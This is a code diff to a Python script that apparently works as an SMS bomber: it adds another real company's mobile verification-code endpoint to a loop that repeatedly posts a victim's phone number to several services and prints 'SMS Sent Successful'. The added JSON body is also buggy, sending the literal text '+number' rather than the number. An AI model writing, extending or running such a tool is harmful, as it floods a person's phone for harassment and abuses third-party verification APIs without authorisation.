@@ -56,6 +56,14 @@ headers5["Content-Type"] = "application/x-www-form-urlencoded"
 
 data5 = "contact=88"+number
 
+#6 
+shoj = "https://xrides.shohoz.com/api/v2/user/send-mobile-verification-code"
+
+headers6 = CaseInsensitiveDict()
+headers6["Content-Type"] = "application/json"
+
+data6 = '{"mobile":"+number"}'
+
 
 
 
@@ -69,6 +77,8 @@ for j in range(amount):
     requests.get(bio)
     resp2 = requests.post(quiz, headers=headers3, data=data3)
     resp5 = requests.post(tms, headers=headers5, data=data5)
+    resp6= requests.post(shoj, headers=headers6, data=data6)
+
 
     print("")
     print(G + "[✓] "+str(j+1)+" SMS Sent Successful...")
